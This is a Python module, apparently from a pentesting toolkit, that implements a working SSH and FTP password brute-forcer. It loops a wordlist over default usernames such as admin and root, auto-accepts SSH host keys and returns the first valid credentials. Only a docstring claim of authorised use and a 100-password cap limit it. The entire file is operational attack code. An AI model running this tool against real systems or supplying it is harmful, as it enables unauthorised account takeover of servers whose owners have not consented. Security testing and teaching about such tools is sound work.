#!/usr/bin/env python3
"""Brute Force Simulation Module — For authorized testing only"""
import socket
import time
from utils.logger import Logger

class BruteForce:
    def __init__(self, target: str, service: str, wordlist: str, logger: Logger):
        self.target = target
        self.service = service
        self.wordlist = wordlist
        self.logger = logger

    def _load_wordlist(self):
        try:
            with open(self.wordlist, "r", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.logger.error(f"Wordlist not found: {self.wordlist}")
            return []

    def _try_ssh(self, username: str, password: str) -> bool:
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=22, username=username,
                         password=password, timeout=3, banner_timeout=5)
            client.close()
            return True
        except:
            return False

    def _try_ftp(self, username: str, password: str) -> bool:
        try:
            from ftplib import FTP
            ftp = FTP()
            ftp.connect(self.target, 21, timeout=3)
            ftp.login(username, password)
            ftp.quit()
            return True
        except:
            return False

    def run(self):
        self.logger.info(f"[*] Starting brute force on {self.target} ({self.service})")
        passwords = self._load_wordlist()
        usernames = ["admin", "root", "user", "test"]

        for user in usernames:
            for pwd in passwords[:100]:  # Limit to 100 attempts for safety
                self.logger.info(f"Trying {user}:{pwd}")
                if self.service == "ssh":
                    success = self._try_ssh(user, pwd)
                elif self.service == "ftp":
                    success = self._try_ftp(user, pwd)
                else:
                    success = False

                if success:
                    self.logger.success(f"[+] FOUND: {user}:{pwd}")
                    return user, pwd
                time.sleep(0.1)

        self.logger.warning("[-] No credentials found")
        return None
